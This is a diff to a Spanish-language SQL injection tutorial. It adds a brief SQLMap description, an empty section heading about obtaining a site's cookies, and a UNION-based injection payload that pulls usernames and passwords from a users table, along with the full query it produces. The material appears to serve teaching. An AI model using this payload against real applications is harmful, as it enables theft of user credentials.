@@ -249,8 +249,26 @@ FROM users	Tabla objetivo que contiene las credenciales.
   </tr>
 </table>
 
+## Como obtener las cookies del sitio web 
 
 
+
+## Usando SQLmap
+
+SQLMap es una herramienta de código abierto y uso automatizado para detectar y explotar vulnerabilidades de inyección SQL (SQL Injection) en aplicaciones web.
+
+#### Exploit 1:
+```bash
+' UNION SELECT user, password FROM users#
+
+```
+
+Es lo mismo que hacer una consulta sql:
+```bash
+
+SELECT id, name FROM products WHERE id = '' UNION SELECT user, password FROM users#';
+
+```
 
 Puedes ver el video del ejemplo en el siguiente link:
 
